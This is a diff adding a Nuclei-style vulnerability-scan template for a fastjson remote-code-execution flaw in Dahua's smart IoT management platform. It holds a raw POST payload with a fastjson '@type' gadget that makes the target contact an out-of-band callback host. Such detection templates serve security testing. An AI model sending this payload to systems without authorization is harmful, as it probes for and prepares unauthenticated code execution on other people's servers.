@@ -1,0 +1,37 @@
+id: dahua-random-fastjson
+info:
+  name:  大华智能物联综合管理平台 fastjson远程代码执行漏洞
+  author: Superhero
+  severity: critical
+  description:  由于大华智能物联综合管理平台使用了存在漏洞的Fastson组件,未经身份验让的攻击者可利用 /ev0-uns/v1.0/auths/sysusers/random接口发送恶意的序列化数据执行任意指令，造成代码执行。
+  tags: RCE
+  
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json;charset=utf-8
+        Accept-Encoding: gzip
+        Connection: close
+
+        {
+           "a":{
+               "@type":"com.alibaba.fastjson.JSONObject",
+               {"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
+               }""
+        }
+
+
+    
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
